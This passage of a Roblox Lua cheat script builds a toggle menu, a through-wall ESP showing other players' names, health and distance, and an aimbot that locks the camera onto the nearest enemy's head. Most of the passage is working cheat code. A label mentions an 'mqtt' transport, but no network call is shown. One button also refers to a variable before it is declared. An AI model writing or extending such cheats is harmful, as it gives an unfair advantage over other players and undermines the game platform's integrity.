makeBtn(main, "Skeleton: OFF",12, 288, 116, 22, function(self) CFG.espSkel = not CFG.espSkel; self.Text = "Skeleton: " .. (CFG.espSkel and "ON" or "OFF") end)
makeBtn(main, "Chams: OFF",   132, 288, 116, 22, function(self) CFG.chams   = not CFG.chams;   self.Text = "Chams: " .. (CFG.chams and "ON" or "OFF") end)

makeBtn(main, "FOV Circle: ON", 12, 314, 236, 22, function(self)
    CFG.fovCircle = not CFG.fovCircle
    self.Text = "FOV Circle: " .. (CFG.fovCircle and "ON" or "OFF")
    fovCircle.Visible = CFG.fovCircle
end)

makeLabel(main, "R = toggle aim   F = toggle esp", 12, 342, 236, 14, 10)
makeLabel(main, "transport: mqtt", 12, 358, 236, 14, 10)

local fovCircle = Instance.new("Frame")
fovCircle.AnchorPoint = Vector2.new(0.5, 0.5)
fovCircle.Size = UDim2.new(0, CFG.fov * 2, 0, CFG.fov * 2)
fovCircle.BackgroundTransparency = 1
fovCircle.BorderSizePixel = 0
fovCircle.Parent = gui
local fstroke = Instance.new("UIStroke")
fstroke.Color = Color3.fromRGB(190, 100, 255)
fstroke.Thickness = 1
fstroke.Parent = fovCircle
local fcorner = Instance.new("UICorner"); fcorner.CornerRadius = UDim.new(1, 0); fcorner.Parent = fovCircle
pulseStroke(fstroke)

local esp = {}

local function buildEsp(plr)
    if plr == LP then return end
    if esp[plr] then
        for _, o in pairs(esp[plr]) do pcall(function() o:Destroy() end) end
    end
    local bucket = {}
    if not plr.Character then esp[plr] = bucket; return end

    local box = Instance.new("BoxHandleAdornment")
    box.Adornee = plr.Character
    box.AlwaysOnTop = true
    box.Size = Vector3.new(2.2, 2.6, 1.2)
    box.Transparency = 0.5
    box.Color3 = Color3.fromRGB(190, 100, 255)
    box.Visible = CFG.espBox
    box.Parent = gui
    bucket.box = box

    local bill = Instance.new("BillboardGui")
    bill.Size = UDim2.new(0, 140, 0, 44)
    bill.StudsOffset = Vector3.new(0, 3.2, 0)
    bill.AlwaysOnTop = true
    bill.Adornee = plr.Character
    bill.Parent = gui
    bucket.bill = bill

    local nameL = Instance.new("TextLabel")
    nameL.BackgroundTransparency = 1
    nameL.Size = UDim2.new(1, 0, 0, 16)
    nameL.TextColor3 = Color3.fromRGB(235, 220, 255)
    nameL.Font = Enum.Font.GothamBold
    nameL.TextSize = 12
    nameL.TextStrokeTransparency = 0
    nameL.Text = plr.Name
    nameL.Visible = CFG.espName
    nameL.Parent = bill
    bucket.nameL = nameL

    local hpL = Instance.new("TextLabel")
    hpL.BackgroundTransparency = 1
    hpL.Size = UDim2.new(1, 0, 0, 14)
    hpL.Position = UDim2.new(0, 0, 0, 16)
    hpL.TextColor3 = Color3.fromRGB(255, 180, 180)
    hpL.Font = Enum.Font.Gotham
    hpL.TextSize = 11
    hpL.TextStrokeTransparency = 0
    hpL.Text = "100"
    hpL.Visible = CFG.espHP
    hpL.Parent = bill
    bucket.hpL = hpL

    local distL = Instance.new("TextLabel")
    distL.BackgroundTransparency = 1
    distL.Size = UDim2.new(1, 0, 0, 14)
    distL.Position = UDim2.new(0, 0, 0, 30)
    distL.TextColor3 = Color3.fromRGB(210, 200, 240)
    distL.Font = Enum.Font.Gotham
    distL.TextSize = 11
    distL.TextStrokeTransparency = 0
    distL.Text = "0m"
    distL.Visible = CFG.espDist
    distL.Parent = bill
    bucket.distL = distL

    esp[plr] = bucket
end

for _, p in ipairs(Players:GetPlayers()) do
    p.CharacterAdded:Connect(function() buildEsp(p) end)
    buildEsp(p)
end
Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(function() buildEsp(p) end)
    buildEsp(p)
end)

UIS.InputBegan:Connect(function(i, gp)
    if gp then return end
    if i.KeyCode == Enum.KeyCode.R then
        CFG.aim = not CFG.aim
        aimBtn.Text = "Aimbot: " .. (CFG.aim and "ON" or "OFF")
    end
    if i.KeyCode == Enum.KeyCode.F then
        CFG.espBox = not CFG.espBox
        CFG.espName = not CFG.espName
        CFG.espHP = not CFG.espHP
        CFG.espDist = not CFG.espDist
    end
end)

RunService.RenderStepped:Connect(function()
    if CFG.fovCircle then
        fovCircle.Position = UDim2.new(0, Camera.ViewportSize.X / 2, 0, Camera.ViewportSize.Y / 2)
        fovCircle.Size = UDim2.new(0, CFG.fov * 2, 0, CFG.fov * 2)
    end

    for plr, bucket in pairs(esp) do
        if plr.Character and plr:FindFirstChild("HumanoidRootPart") then
            if bucket.bill then bucket.bill.Adornee = plr.Character end
            if bucket.box then bucket.box.Adornee = plr.Character; bucket.box.Visible = CFG.espBox end
            if bucket.nameL then bucket.nameL.Visible = CFG.espName end
            if bucket.hpL then
                local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                bucket.hpL.Text = hum and tostring(math.floor(hum.Health)) or "0"
                bucket.hpL.Visible = CFG.espHP
            end
            if bucket.distL then
                local d = (Camera.CFrame.Position - plr.Character.HumanoidRootPart.Position).Magnitude
                bucket.distL.Text = string.format("%dm", math.floor(d))
                bucket.distL.Visible = CFG.espDist
            end
        end
    end

    if not CFG.aim then return end

    local camPos = Camera.CFrame.Position
    local center = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    local closest, dist = nil, CFG.fov

    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health > 0 then
                if not (CFG.team and p.Team and LP.Team and p.Team == LP.Team) then
                    local part = p.Character:FindFirstChild(CFG.bone) or p.Character:FindFirstChild("Head")
                    if part then
                        local scr, onScreen = Camera:WorldToViewportPoint(part.Position)
                        if onScreen then
                            local d = (Vector2.new(scr.X, scr.Y) - center).Magnitude
                            if d < dist then
                                if CFG.vis then
                                    local ray = Ray.new(camPos, (part.Position - camPos))
                                    local hit = workspace:FindPartOnRayWithIgnoreList(ray, { LP.Character, p.Character })
                                    if not hit then dist = d; closest = p end
                                else
                                    dist = d; closest = p
                                end
                            end
                        end
                    end
                end
            end
        end
    end

    if closest and closest.Character then
        local part = closest.Character:FindFirstChild(CFG.bone) or closest.Character:FindFirstChild("Head")
        if part then
            local goal = CFrame.new(camPos, part.Position)
            Camera.CFrame = Camera.CFrame:Lerp(goal, 1 - CFG.smooth)
        end
    end
end)
